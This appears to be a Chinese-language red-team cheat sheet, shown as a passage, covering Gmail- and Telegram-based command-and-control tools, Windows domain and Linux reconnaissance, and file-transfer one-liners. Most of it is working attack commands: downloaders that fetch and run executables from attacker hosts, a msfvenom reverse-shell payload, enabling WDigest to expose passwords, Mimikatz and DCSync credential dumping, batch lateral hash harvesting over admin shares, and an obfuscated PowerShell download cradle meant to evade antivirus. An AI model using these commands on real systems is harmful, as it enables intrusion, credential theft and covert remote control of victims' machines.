<pre><code>执行后，邮箱会收到信息
</code></pre>
<p><img src="286.png" alt="image"></p>
<pre><code>使用gcat.py也可以得到当前会话
&gt;python gcat.py -list
</code></pre>
<p><img src="287.png" alt="image"></p>
<pre><code>现在可对其进行控制
&gt;python gcat.py -id [id] -cmd &#39;net user&#39;
</code></pre>
<p><img src="288.png" alt="image"></p>
<pre><code>生成jobid，指定jobid可查看回显
</code></pre>
<p><img src="289.png" alt="image"></p>
<pre><code>邮箱中也存在
</code></pre>
<p><img src="290.png" alt="image"></p>
<pre><code>当受控机为中文系统时，回显会报错，修改代码
</code></pre>
<p><img src="291.png" alt="image"></p>
<pre><code>其他模块有回显的直接修改后重新py2exe打包即可。
支持的功能:cmd,upload/download,执行shellcode,键盘记录,截屏等
</code></pre>
<h4 id="Gdog"><a href="#Gdog" class="headerlink" title="Gdog"></a>Gdog</h4><pre><code>https://github.com/maldevel/gdog
功能更多:
加密传输、地理位置、执行命令、上传下载、shellcode、截图、键盘记录、关闭重启、注销用户、从web下载、访问网站等
配置流程基本一样，需要打包exe，但是要安装一些模块PyCrypto、WMI、Enum34、Netifaces
# setup.py
from distutils.core import setup
import py2exe
 
setup(console=[&#39;client.py&#39;])
client.py在回显处也要添加decode gbk
执行client.exe报超出索引错误时
在client.py中搜索字符串for iface in netifaces.interfaces():
在它下面一行修改为
if netifaces.ifaddresses(iface)[netifaces.AF_LINK][0][&#39;addr&#39;] == self.MAC and netifaces.AF_INET in netifaces.ifaddresses(iface):
打包好后执行
</code></pre>
<p><img src="292.png" alt="image"><br><img src="293.png" alt="image"><br><img src="294.png" alt="image"><br><img src="295.png" alt="image"></p>
<pre><code>提取jobid回显出错的话，添加
reload(sys)
sys.setdefaultencoding(&quot;utf-8&quot;)
执行shellcode
&gt;msfvenom -p windows/meterpreter/reverse_tcp -a x86 --platform Windows EXITFUNC=thread LPORT=4444 LHOST=x.x.x.x -f python
去除引号加减号，只保留shellcode粘贴到文件shell.txt
&gt;python gdog.py -id &#123;id&#125; -exec-shellcode /tmp/shell.txt
</code></pre>
<h3 id="Telegram-C2"><a href="#Telegram-C2" class="headerlink" title="Telegram C2"></a>Telegram C2</h3><pre><code>登录telegram
访问https://telegram.me/botfather，发送消息
</code></pre>
<p><img src="296.png" alt="image"></p>
<pre><code>创建一个bot
</code></pre>
<p><img src="297.png" alt="image"></p>
<pre><code>创建完成后返回一个token
&gt;pip install telepot
&gt;pip install requests
&gt;git clone https://github.com/blazeinfosec/bt2.git
编辑bt2.py
粘贴token和chatid进脚本
Chat_id的获取方式
https://api.telegram.org/bot&lt;token&gt;/getUpdates
</code></pre>
<p><img src="298.png" alt="image"><br><img src="299.png" alt="image"></p>
<pre><code>当有受控机上线时会列出功能
</code></pre>
<p><img src="300.png" alt="image"><br><img src="301.png" alt="image"></p>
<pre><code>Windows
https://github.com/sf197/Telegra_Csharp_C2
</code></pre>
<h2 id="信息收集-2"><a href="#信息收集-2" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="Cmd"><a href="#Cmd" class="headerlink" title="Cmd"></a>Cmd</h3><pre><code>&gt;whoami /user 查看当前用户SID
&gt;net config Workstation 查看当前计算机信息
&gt;net time /domain 判断主域
错误5：存在域，当前不是域用户
显示时间：存在域，当前是域内用户
找不到域：不存在
&gt;net view /domain 列出域列表
&gt;net group &quot;Domain Controllers&quot; /domain查看主域控
&gt;nltest /DCLIST:zone.com 查看域控
&gt;net group &quot;domain admins&quot; /domain 查看域管理员
&gt;net group &quot;enterprise admins&quot; /domain 查看企业管理员列表
&gt;net localgroup administrators /domain 查看管理组用户
&gt;net group &quot;domain computers&quot; /domain 查看域成员计算机
&gt;net accounts /domain 查看密码策略
&gt;net user /domain查看域内用户
&gt;net view /domain:dc 查询域内计算机
&gt;netsh firewall set opmode disable/enable 关闭windows防火墙(win2003)
&gt;netsh advfirewall set allprofiles state off/on(大于win2003)
&gt;arp -a查看arp表
&gt;net start 查看服务
&gt;route print查看路由表
&gt;query user查看登录机器的用户的连接状态
&gt;tasklist /v 查看域管理员进程
&gt;dsquery server查询域控制器
&gt;dsquery computer 查询域内机器
&gt;dsquery user 查询域用户
&gt;dsquery ou 域内组织单位
导出域DNS记录，文件保存在C:\Windows\System32\dns\
&gt;dnscmd /zoneexport zone.com 1.txt
导出LDAP数据库
&gt;LDIFDE -f c:\windows\temp\dump.ldf -n -m
</code></pre>
<h3 id="Wmi"><a href="#Wmi" class="headerlink" title="Wmi"></a>Wmi</h3><pre><code>&gt;wmic OS get Caption,CSDVersion,OSArchitecture,Version系统版本
&gt;wmic service list brief 列出本机服务
&gt;wmic process list brief 列出进程
&gt;wmic process where name=&quot;chrome.exe&quot; get executablepath进程路径
&gt;wmic process get caption,commandline /value&gt;&gt;1.txt查询所有进程参数
&gt;wmic process where caption=&quot;svchost.exe&quot; get caption,commandline /value 查询某个进程命令行参数
创建进程
&gt;wmic process call create calc
&gt;wmic process call create &quot;C:\shell.exe&quot;
&gt;wmic process call create &quot;shutdown.exe -r -f -t 20&quot;
结束进程
&gt;wmic process where name=&quot;shell.exe&quot; call terminate
&gt;wmic process where processid=&quot;2345&quot; delete
&gt;wmic process 2345 call terminate
&gt;wmic startup list brief 列出自启动程序
&gt;wmic /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List 查看杀毒软件
&gt;wmic netuse list brief 列出共享驱动盘
&gt;wmic ntdomain list brief 查询域控制器
&gt;wmic useraccount list brief 列出本机管理员及SID
&gt;wmic qfe list brief 列出补丁列表
&gt;wmic share get name,path 查看共享
&gt;wmic startup list brief查看启动项
&gt;wmic product get name,version 查看安装的软件
&gt;wmic product where &quot;name like &#39;%360%&#39;&quot; get name 查看程序名
&gt;wmic product where name=&quot;360tray&quot; call uninstall 卸载程序
&gt;wmic process where &quot;name like &#39;%360%&#39;&quot; get name 查找进程全名
&gt;wmic product where name=&quot;360tray.exe&quot; call terminate 停止程序
&gt;wmic desktop get screensaversecure,screensavertimeout 查看屏保
</code></pre>
<h3 id="PowerView"><a href="#PowerView" class="headerlink" title="PowerView"></a>PowerView</h3><pre><code>获取域信息
&gt;powershell -exec bypass -Command &quot;&amp;&#123;Import-Module .\powerview.ps1; Get-NetDomain&#125;&quot;
</code></pre>
<p><img src="302.png" alt="image"></p>
<pre><code>&gt;powershell -exec bypass -Command &quot;&amp;&#123;Import-Module .\powerview.ps1; get-netforest&#125;&quot;
</code></pre>
<p><img src="303.png" alt="image"></p>
<pre><code>枚举管理员
&gt;powershell -exec bypass -Command &quot;&amp;&#123;Import-Module .\powerview.ps1; Invoke-EnumerateLocalAdmin&#125;&quot;
</code></pre>
<p><img src="304.png" alt="image"></p>
<pre><code>查询管理在线的机器
&gt;powershell -exec bypass -Command &quot;&amp;&#123;Import-Module .\powerview.ps1; invoke-userhunter&#125;&quot;
</code></pre>
<p><img src="305.png" alt="image"></p>
<pre><code>查看域内机器以administrator权限运行的进程
&gt;powershell -exec bypass -Command &quot;&amp;&#123;Import-Module .\powerview.ps1; invoke-processhunter &#125;&quot;
</code></pre>
<p><img src="306.png" alt="image"></p>
<pre><code>或指定参数userfile和computerfile查询某台机器某个用户的进程
&gt;powershell -exec bypass -Command &quot;&amp;&#123;Import-Module .\powerview.ps1; invoke-processhunter -Userfile .\user.txt -computerfile .\host.txt&#125;&quot;
</code></pre>
<p><img src="307.png" alt="image"></p>
<pre><code>查询域内机器共享
&gt;powershell -exec bypass -Command &quot;&amp;&#123;Import-Module .\powerview.ps1; Invoke-sharefinder&#125;&quot;
</code></pre>
<p><img src="308.png" alt="image"></p>
<pre><code>查询域内机器
&gt;Get-NetComputer -Domain zone.com
</code></pre>
<p><img src="309.png" alt="image"></p>
<pre><code>&gt;Find-LocalAdminAccess -verbose 查询域内本地用户能登录的机器
</code></pre>
<p><img src="310.png" alt="image"></p>
<pre><code>Dev-powerview
获取域控机器和win版本
&gt;Get-DomainController |select name,osversion|fl 
</code></pre>
<h3 id="Linux-3"><a href="#Linux-3" class="headerlink" title="Linux"></a>Linux</h3><pre><code>操作系统&amp;内核版本&amp;环境变量
&gt;cat /etc/issue
&gt;cat /etc/*-release
&gt;cat /etc/lsb-release
&gt;cat /etc/redhat-release
cat /proc/version
&gt;uname -a
&gt;uname -mrs
&gt;rpm -q kernel
&gt;dmesg | grep Linux
&gt;ls /boot | grep vmlinuz-
&gt;cat /etc/profile
&gt;cat /etc/bashrc
&gt;cat ~/.bash_profile
&gt;cat ~/.bashrc
&gt;cat ~/.bash_logout
&gt;env
&gt;set
Root权限进程
&gt;ps aux | grep root
&gt;ps -ef | grep root
计划任务
&gt;crontab -l
&gt;ls -alh /var/spool/cron
&gt;ls -al /etc/ | grep cron
&gt;ls -al /etc/cron*
&gt;cat /etc/cron*
&gt;cat /etc/at.allow
&gt;cat /etc/at.deny
&gt;cat /etc/cron.allow
&gt;cat /etc/cron.deny
&gt;cat /etc/crontab
&gt;cat /etc/anacrontab
&gt;cat /var/spool/cron/crontabs/root
IP信息
&gt;/sbin/ifconfig -a
&gt;cat /etc/network/interfaces
&gt;cat /etc/sysconfig/network
连接信息
&gt;grep 80 /etc/services
&gt;netstat -antup
&gt;netstat -antpx
&gt;netstat -tulpn
&gt;chkconfig --list
&gt;chkconfig --list | grep 3:on
&gt;last
&gt;w
用户信息
&gt;id
&gt;whomi
&gt;w
&gt;last
&gt;cat /etc/passwd
&gt;cat /etc/group
&gt;cat /etc/shadow
&gt;ls -alh /var/mail/
&gt;grep -v -E &quot;^#&quot; /etc/passwd | awk -F: &#39;$3 == 0 &#123; print $1&#125;&#39;   # 列出超级用户
&gt;awk -F: &#39;($3 == &quot;0&quot;) &#123;print&#125;&#39; /etc/passwd   #列出超级用户
&gt;cat /etc/sudoers
&gt;sudo –l
操作记录
&gt;cat ~/.bash_history
&gt;cat ~/.nano_history
&gt;cat ~/.atftp_history
&gt;cat ~/.mysql_history
&gt;cat ~/.php_history
可写目录
&gt;find / -writable -type d 2&gt;/dev/null      # 可写目录
&gt;find / -perm -222 -type d 2&gt;/dev/null     # 可写目录 
&gt;find / -perm -o w -type d 2&gt;/dev/null     # 可写目录
&gt;find / -perm -o x -type d 2&gt;/dev/null     # 可执行目录
&gt;find / \( -perm -o w -perm -o x \) -type d 2&gt;/dev/null   # 可写可执行目录
</code></pre>
<h2 id="HTTP服务"><a href="#HTTP服务" class="headerlink" title="HTTP服务"></a>HTTP服务</h2><pre><code>&gt;python2 -m SimpleHTTPServer 
&gt;python3 -m http.server 8080
&gt;php -S 0.0.0.0:8888
&gt;openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes
&gt;openssl s_server -key key.pem -cert cert.pem -accept 443 –WWW
&gt;ruby -rwebrick -e &quot;WEBrick::HTTPServer.new(:Port =&gt; 8888,:DocumentRoot =&gt; Dir.pwd).start&quot;
&gt;ruby -run -e httpd . -p 8888
</code></pre>
<h2 id="文件操作-1"><a href="#文件操作-1" class="headerlink" title="文件操作"></a>文件操作</h2><h3 id="Windows查找文件"><a href="#Windows查找文件" class="headerlink" title="Windows查找文件"></a>Windows查找文件</h3><pre><code>&gt;cd /d E: &amp;&amp; dir /b /s index.php
&gt;for /r E:\ %i in (index*.php) do @echo %i
&gt;powershell Get-ChildItem d:\ -Include index.php -recurse
</code></pre>
<h3 id="Linux查找文件"><a href="#Linux查找文件" class="headerlink" title="Linux查找文件"></a>Linux查找文件</h3><pre><code>#find / -name index.php
查找木马文件
&gt;find . -name &#39;*.php&#39; | xargs grep -n &#39;eval(&#39;
&gt;find . -name &#39;*.php&#39; | xargs grep -n &#39;assert(&#39;
&gt;find . -name &#39;*.php&#39; | xargs grep -n &#39;system(&#39;
</code></pre>
<h3 id="创建"><a href="#创建" class="headerlink" title="创建"></a>创建</h3><pre><code>读文本文件：
&gt;file = Get-Content &quot;1.txt&quot;
&gt;file
&gt;powershell Set-content &quot;1.txt&quot; &quot;wocao&quot;
&amp;
&gt;powershell &quot;write-output ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(\&quot;d2Vic2hlbGw=\&quot;))) | out-file -filepath c:\www\wwwroot\1.aspx;&quot;
</code></pre>
<h3 id="压缩"><a href="#压缩" class="headerlink" title="压缩"></a>压缩</h3><pre><code>&gt;rar.exe a –k –r –s –m3 C:\1.rar C:\wwwroot
&gt;7z.exe a –r –p12345 C:\1.7z C:\wwwroot
</code></pre>
<h3 id="解压"><a href="#解压" class="headerlink" title="解压"></a>解压</h3><pre><code>&gt;rar.exe e c:\wwwroot\1.rar
&gt;7z.exe x –p12345 C:\1.7z –oC:\wwwroot
</code></pre>
<h3 id="传输"><a href="#传输" class="headerlink" title="传输"></a>传输</h3><h4 id="FTP"><a href="#FTP" class="headerlink" title="FTP"></a>FTP</h4><pre><code>&gt;open 192.168.0.98 21
&gt;输入账号密码
&gt;dir查看文件
&gt;get file.txt
</code></pre>
<p><img src="311.png" alt="image"></p>
<h4 id="VBS"><a href="#VBS" class="headerlink" title="VBS"></a>VBS</h4><pre><code>#1.vbs
</code></pre>
<figure class="highlight vb"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Set</span> Post = CreateObject(<span class="string">&quot;Msxml2.XMLHTTP&quot;</span>)</span><br><span class="line"><span class="keyword">Set</span> Shell = CreateObject(<span class="string">&quot;Wscript.Shell&quot;</span>)</span><br><span class="line">Post.Open <span class="string">&quot;GET&quot;</span>,<span class="string">&quot;http://192.168.1.192/Client.exe&quot;</span>,<span class="number">0</span></span><br><span class="line">Post.Send()</span><br><span class="line"><span class="keyword">Set</span> aGet = CreateObject(<span class="string">&quot;ADODB.Stream&quot;</span>)</span><br><span class="line">aGet.Mode = <span class="number">3</span></span><br><span class="line">aGet.Type = <span class="number">1</span></span><br><span class="line">aGet.Open()</span><br><span class="line">aGet.Write(Post.responseBody)</span><br><span class="line">aGet.SaveToFile <span class="string">&quot;C:\1.exe&quot;</span>,<span class="number">2</span> </span><br><span class="line">&gt;cscript <span class="number">1</span>.vbs</span><br><span class="line"><span class="keyword">Const</span> adTypeBinary = <span class="number">1</span></span><br><span class="line"><span class="keyword">Const</span> adSaveCreateOverWrite = <span class="number">2</span></span><br><span class="line"><span class="keyword">Dim</span> http,ado</span><br><span class="line"><span class="keyword">Set</span> http = CreateObject(<span class="string">&quot;Msxml2.serverXMLHTTP&quot;</span>)</span><br><span class="line">http.SetOption 2,13056//忽略HTTPS错误</span><br><span class="line">http.open <span class="string">&quot;GET&quot;</span>,<span class="string">&quot;http://192.168.1.192/Client.exe&quot;</span>,<span class="literal">False</span></span><br><span class="line">http.send</span><br><span class="line"><span class="keyword">Set</span> ado = createobject(<span class="string">&quot;Adodb.Stream&quot;</span>)</span><br><span class="line">ado.Type = adTypeBinary</span><br><span class="line">ado.Open</span><br><span class="line">ado.Write http.responseBody</span><br><span class="line">ado.SaveToFile <span class="string">&quot;c:\1.exe&quot;</span></span><br><span class="line">ado.Close</span><br></pre></td></tr></table></figure>
<h4 id="JS"><a href="#JS" class="headerlink" title="JS"></a>JS</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> WinHttpReq = <span class="keyword">new</span> ActiveXObject(<span class="string">&quot;WinHttp.WinHttpRequest.5.1&quot;</span>);</span><br><span class="line">WinHttpReq.Open(<span class="string">&quot;GET&quot;</span>, WScript.Arguments(<span class="number">0</span>), <span class="comment">/*async=*/</span><span class="literal">false</span>);</span><br><span class="line">WinHttpReq.Send();</span><br><span class="line">BinStream = <span class="keyword">new</span> ActiveXObject(<span class="string">&quot;ADODB.Stream&quot;</span>);</span><br><span class="line">BinStream.Type = <span class="number">1</span>; BinStream.Open();</span><br><span class="line">BinStream.Write(WinHttpReq.ResponseBody);</span><br><span class="line">BinStream.SaveToFile(<span class="string">&quot;1.exe&quot;</span>);</span><br></pre></td></tr></table></figure>
<pre><code>&gt;cscript /nologo 1.js http://192.168.1.192/Client.exe
</code></pre>
<p><img src="312.png" alt="image"></p>
<h4 id="Bitsadmin"><a href="#Bitsadmin" class="headerlink" title="Bitsadmin"></a>Bitsadmin</h4><pre><code>&gt;bitsadmin /transfer n http://192.168.1.192/Client.exe  e:\1.exe
&gt;bitsadmin /rawreturn /transfer getfile http://192.168.1.192/Client.exe e:\1.exe
&gt;bitsadmin /rawreturn /transfer getpayload http://192.168.1.192/Client.exe e:\1.exe
&gt;bitsadmin /transfer myDownLoadJob /download /priority normal &quot;http://192.168.1.192/Client.exe&quot; &quot;e:\1.exe &quot;
</code></pre>
<h4 id="Powershell-2"><a href="#Powershell-2" class="headerlink" title="Powershell"></a>Powershell</h4><h5 id="1-2"><a href="#1-2" class="headerlink" title="1"></a>1</h5><pre><code>注意：内核5.2以下版本可能无效
&gt;powershell (new-object System.Net.WebClient).DownloadFile(&#39;http://192.168.1.1/Client.exe&#39;,&#39;C:\1.exe&#39;); start-process &#39;c:\1.exe&#39;
&gt;powershell 
&gt;(New-Object System.Net.WebClient).DownloadFile(&#39;http://192.168.0.108/1.exe&#39;,&quot;$env:APPDATA\csrsv.exe&quot;);Start-Process(&quot;$env:APPDATA\csrsv.exe&quot;)
</code></pre>
<h5 id="2-2"><a href="#2-2" class="headerlink" title="2"></a>2</h5><pre><code>PS&gt;Copy-Item &#39;\\sub2k8.zone.com\c$\windows\1.txt&#39; -Destination &#39;\\dc.zone.com\c$\1.txt&#39;
</code></pre>
<h5 id="3"><a href="#3" class="headerlink" title="3"></a>3</h5><pre><code>&gt;powershell ($dpl=$env:temp+&#39;f.exe&#39;);(New-Object System.Net.WebClient).DownloadFile(&#39;http://192.168.0.108/ok.txt&#39;,$dpl);
</code></pre>
<h5 id="4"><a href="#4" class="headerlink" title="4"></a>4</h5><pre><code>高版本
PS&gt;iwr -Uri http://192.168.0.106:1222/111.txt -OutFile 123.txt –UseBasicParsing
</code></pre>
<h5 id="5"><a href="#5" class="headerlink" title="5"></a>5</h5><pre><code>C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Templates
&gt;Import-Module BitsTransfer
&gt;$path = [environment]::getfolderpath(&quot;temp&quot;)
&gt;Start-BitsTransfer -Source &quot;http://192.168.0.108/ok.txt&quot; -Destination &quot;$path\ok.txt&quot;
&gt;Invoke-Item  &quot;$path\ok.txt&quot;
</code></pre>
<h4 id="Certutil"><a href="#Certutil" class="headerlink" title="Certutil"></a>Certutil</h4><pre><code>&gt;certutil.exe -urlcache -split -f http://192.168.1.192/Client.exe 
&gt;certutil.exe -urlcache -split -f http://192.168.1.192/Client.exe delete
对文件进行编码下载后解码执行
&gt;base64 payload.exe &gt; /var/www/html/1.txt # 在C&amp;C上生成经base64编码的exe
&gt;certutril -urlcache -split -f http://192.168.0.107/1.txt &amp; certurl -decode 1.txt ms.exe &amp; ms.exe
</code></pre>
<h4 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h4><pre><code>#python -c &#39;import urllib;urllib.urlretrieve(&quot;http://192.168.1.192/Client.exe&quot;,&quot;/path/to/save/1.exe&quot;)&#39;
</code></pre>
<h4 id="Perl"><a href="#Perl" class="headerlink" title="Perl"></a>Perl</h4><pre><code>#!/usr/bin/perl 
use LWP::Simple; 
getstore(&quot;http://192.168.1.192/Client.exe&quot;, &quot;1.exe&quot;);
</code></pre>
<h4 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h4><pre><code>#!/usr/bin/php 
&lt;?php $data = @file(&quot;http://192.168.1.192/Client.exe&quot;);
$lf = &quot;1.exe&quot;;         
$fh = fopen($lf, &#39;w&#39;);         
fwrite($fh, $data[0]);         
fclose($fh); 
?&gt;
</code></pre>
<h4 id="Curl"><a href="#Curl" class="headerlink" title="Curl"></a>Curl</h4><pre><code>#curl -o 1.exe http://192.168.1.192/Client.exe
</code></pre>
<h4 id="wget"><a href="#wget" class="headerlink" title="wget"></a>wget</h4><pre><code>#wget http://192.168.1.192/Client.exe
#wget –b后台下载
#wget –c 中断恢复
</code></pre>
<h4 id="nc-1"><a href="#nc-1" class="headerlink" title="nc"></a>nc</h4><pre><code>&gt;nc –lvnp 333 &gt;1.txt
目标机
&gt;nc –vn 192.168.1.2 333 &lt;test.txt –q 1
&amp;
&gt;cat 1.txt &gt;/dev/tcp/1.1.1.1/333
</code></pre>
<h4 id="SCP"><a href="#SCP" class="headerlink" title="SCP"></a>SCP</h4><pre><code>Linux中传输文件
&gt;scp -P 22 file.txt user@1.1.1.1:/tmp
</code></pre>
<h2 id="Hash-amp-密码"><a href="#Hash-amp-密码" class="headerlink" title="Hash&amp;密码"></a>Hash&amp;密码</h2><h3 id="破解网址"><a href="#破解网址" class="headerlink" title="破解网址"></a>破解网址</h3><pre><code>https://www.objectif-securite.ch/en/ophcrack
http://cracker.offensive-security.com/index.php
</code></pre>
<h3 id="GoogleColab破解hash"><a href="#GoogleColab破解hash" class="headerlink" title="GoogleColab破解hash"></a>GoogleColab破解hash</h3><pre><code>之前在freebuf上看到过相关文章，最近在github上也看到了这个脚本，所以拿起来试试，速度可观
https://www.freebuf.com/geek/195453.html
https://gist.github.com/chvancooten/59acfbf1d8ee7a865108fca2e9d04c4a
打开
https://drive.google.com/drive
新建一个文件夹，右键，更多选择google Colab
</code></pre>
<p><img src="667.png" alt="image"></p>
<pre><code>如果没有，点关联更多应用，搜索这个名字，安装一下即可
</code></pre>
<p><img src="668.png" alt="image"><br><img src="669.png" alt="image"></p>
<pre><code>安装hashcat，下载字典
</code></pre>
<p><img src="670.png" alt="image"></p>
<pre><code>运行类型选择GPU加速
</code></pre>
<p><img src="671.png" alt="image"><br><img src="672.png" alt="image"></p>
<pre><code>这里测试个简单密码
</code></pre>
<p><img src="673.png" alt="image"><br><img src="674.png" alt="image"><br><img src="675.png" alt="image"><br><img src="676.png" alt="image"></p>
<pre><code>12亿条密码大概20多分钟
https://download.weakpass.com/wordlists/1851/hashesorg2019.gz
以上是字典
</code></pre>
<p><img src="677.png" alt="image"></p>
<h3 id="密码策略"><a href="#密码策略" class="headerlink" title="密码策略"></a>密码策略</h3><pre><code>默认情况，主机账号的口令每30天变更一次
&gt;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\Netlogon\Parameters，键值为DisablePasswordChange，设置为1，即表示禁止修改账号口令
&gt;组策略(gpedit.msc)中修改默认的30天，修改位置为&quot;Computer Configuration\Windows Settings\Security Settings\Local Policies\Security Options\Domain member: Maximum machine account password age&quot;设置为0时，表示无限长
&gt;禁止修改主机账号口令，用来支持VDI (virtual desktops)等类型的使用，具体位置为&quot;Computer Configuration\Windows Settings\Security Settings\Local Policies\Security Options\Domain member: Disable machine account password changes&quot;
Debug Privilege
本地安全策略&gt;本地策略&gt;用户权限分配&gt;调试程序
</code></pre>
<h3 id="开启Wdigest"><a href="#开启Wdigest" class="headerlink" title="开启Wdigest"></a>开启Wdigest</h3><h4 id="Cmd-1"><a href="#Cmd-1" class="headerlink" title="Cmd"></a>Cmd</h4><pre><code>&gt;reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
</code></pre>
<h4 id="powershell"><a href="#powershell" class="headerlink" title="powershell"></a>powershell</h4><pre><code>&gt;Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest -Name UseLogonCredential -Type DWORD -Value 1
</code></pre>
<h4 id="meterpreter"><a href="#meterpreter" class="headerlink" title="meterpreter"></a>meterpreter</h4><pre><code>&gt;reg setval -k HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest -v UseLogonCredential -t REG_DWORD -d 1
</code></pre>
<h3 id="Getpass"><a href="#Getpass" class="headerlink" title="Getpass"></a>Getpass</h3><pre><code>&gt;getpassword.exe&gt;1.txt
</code></pre>
<h3 id="QuarksPwDump"><a href="#QuarksPwDump" class="headerlink" title="QuarksPwDump"></a>QuarksPwDump</h3><pre><code>&gt;QuarksPwDump.exe -dump-hash-local
</code></pre>
<h3 id="MSF-4"><a href="#MSF-4" class="headerlink" title="MSF"></a>MSF</h3><pre><code>Meterpreter &gt; run hashdump 
&amp;
Meterpreter &gt; mimikatz_command -f samdump::hashes
&amp;
Meterpreter &gt; load mimikatz
Meterpreter &gt; wdigest
&amp;
Meterpreter &gt; load mimikatz
Meterpreter &gt; msv
Meterpreter &gt; kerberos
&amp;
Meterpreter &gt; load kiwi
Meterpreter &gt; creds_all
&amp;
Meterpreter &gt; migrate PID
Meterpreter &gt; load mimikatz
Meterpreter &gt; mimikatz_command -f sekurlsa::searchPasswords
&amp;
Meterpreter &gt; run windows/gather/smart_hashdump
</code></pre>
<h3 id="Empire-1"><a href="#Empire-1" class="headerlink" title="Empire"></a>Empire</h3><pre><code>&gt;usemodule credentials/mimikatz/dcsync_hashdump
</code></pre>
<h3 id="Invoke-Dcsync"><a href="#Invoke-Dcsync" class="headerlink" title="Invoke-Dcsync"></a>Invoke-Dcsync</h3><pre><code>&gt;powershell -nop -ep bypass &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http://192.168.0.107/ps/Invoke-DCSync.ps1&#39;);invoke-dcsync
</code></pre>
<p><img src="313.png" alt="image"></p>
<h3 id="Mimikatz"><a href="#Mimikatz" class="headerlink" title="Mimikatz"></a>Mimikatz</h3><h4 id="调用mimikatz远程抓取"><a href="#调用mimikatz远程抓取" class="headerlink" title="调用mimikatz远程抓取"></a>调用mimikatz远程抓取</h4><pre><code>抓明文
&gt;powershell IEX (New-Object Net.WebClient).DownloadString(&#39;http://192.168.0.108/nishang/Gather/Invoke-Mimikatz.ps1&#39;); Invoke-Mimikatz
抓hash
&gt;powershell IEX (New-Object Net.WebClient).DownloadString(&#39;http://192.168.0.100/nishang/Gather/Get-PassHashes.ps1&#39;);Get-PassHashes
&gt;powershell -w hidden -ep bypass &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http://192.168.0.107/ps/powersploit/Exfiltration/Invoke-Mimikatz.ps1&#39;); Invoke-Mimikatz&quot; &gt;C:\Users\Administrator.DC\Desktop\1123.txt
</code></pre>
<h4 id="横向批量抓hash"><a href="#横向批量抓hash" class="headerlink" title="横向批量抓hash"></a>横向批量抓hash</h4><h5 id="Schtasks"><a href="#Schtasks" class="headerlink" title="Schtasks"></a>Schtasks</h5><pre><code>把IP列表放入ip.txt文件中，通过一个账户密码批量net use与列表里的IP建立连接，如果建立连接没出错的话，复制getpass到目录temp目录，使用账户密码远程创建计划任务名字为windowsupdate，指定每日00：00以system权限执行getpass文件，创建完计划任务后，/tn是立刻执行此计划任务，执行完后删除此计划任务，ping -n 10&gt;nul是程序停留，相当于延时10秒，之后复制文件到本地，接着删除getpass文件，删除创建的连接。
&gt;for /f %i in (ip.txt) do net use \\%i\admin$ /user:&quot;administrator&quot; &quot;password&quot; &amp; if %errorlevel% equ 0 ( copy getpass.exe \\%i\admin$\temp\ /Y ) &amp; schtasks /create /s &quot;%i&quot; /u &quot;administrator&quot; /p &quot;password&quot; /RL HIGHEST /F /tn &quot;windowsupdate&quot; /tr &quot;c:\windows\temp\getpass.exe&quot; /sc DAILY /mo 1 /ST 00:00 /RU SYSTEM &amp; schtasks /run /tn windowsupdate /s &quot;%i&quot; /U &quot;administrator&quot; /P &quot;password&quot; &amp; schtasks /delete /F /tn windowsupdate /s &quot;%i&quot; /U &quot; administrator&quot; /P &quot;password&quot; &amp; @ping 127.0.0.1 -n 10 &gt;nul &amp; move \\%i\admin$\temp\dumps.logs C:\Users\Public\%i.logs &amp; del \\%i\admin$\debug\getpass.exe /F &amp; net use \\%i\admin$ /del
</code></pre>
<h5 id="Wmic"><a href="#Wmic" class="headerlink" title="Wmic"></a>Wmic</h5><pre><code>&gt;for /f %i in (ip.txt) do net use \\%i\admin$ /user:&quot;administrator&quot; &quot;password&quot; &amp; if %errorlevel% equ 0 ( copy getpass.exe \\%i\admin$\temp\ /Y ) &amp; wmic /NODE:&quot;%i&quot; /user:&quot;administrator&quot; /password:&quot;password&quot; PROCESS call create &quot;c:\windows\temp\getpass.exe&quot; &amp; @ping 127.0.0.1 -n 10 &gt;nul &amp; move \\%i\admin$\temp\dumps.logs C:\Users\Public\%i.logs &amp; del \\%i\admin$\temp\getpass.exe /F &amp; net use \\%i\admin$ /del
</code></pre>
<h4 id="直接使用"><a href="#直接使用" class="headerlink" title="直接使用"></a>直接使用</h4><pre><code>&gt;mimikatz.exe &quot;&quot;privilege::debug&quot;&quot; &quot;&quot;sekurlsa::logonpasswords full&quot;&quot; exit &gt;&gt; log.txt 
&gt;privilege::debug
&gt;misc::memssp
锁屏
&gt;rundll32.exe user32.dll,LockWorkStation
记录的结果在c:\windows\system32\mimilsa.log
&gt;mimikatz log &quot;privilege::debug&quot; &quot;lsadump::lsa /patch&quot;
&gt;mimikatz !privilege::debug 
&gt;mimikatz !token::elevate 
&gt;mimikatz !lsadump::sam
</code></pre>
<h4 id="Powershell-Bypass"><a href="#Powershell-Bypass" class="headerlink" title="Powershell Bypass"></a>Powershell Bypass</h4><pre><code>&gt;powershell -c &quot; (&#39;IEX &#39;+&#39;(Ne&#39;+&#39;w-O&#39;+&#39;bject Ne&#39;+&#39;t.W&#39;+&#39;ebClien&#39;+&#39;t).Do&#39;+&#39;wnloadS&#39;+&#39;trin&#39;+&#39;g&#39;+&#39;(&#39;+&#39;1vchttp://&#39;+&#39;192.168.0&#39;+&#39;.101/&#39;+&#39;Inv&#39;+&#39;oke-Mimik&#39;+&#39;a&#39;+&#39;tz.&#39;+&#39;ps11v&#39;+&#39;c)&#39;+&#39;;&#39;+&#39;I&#39;+&#39;nvoke-Mimika&#39;+&#39;tz&#39;).REplaCE(&#39;1vc&#39;,[STRing][CHAR]39)|IeX&quot;
</code></pre>
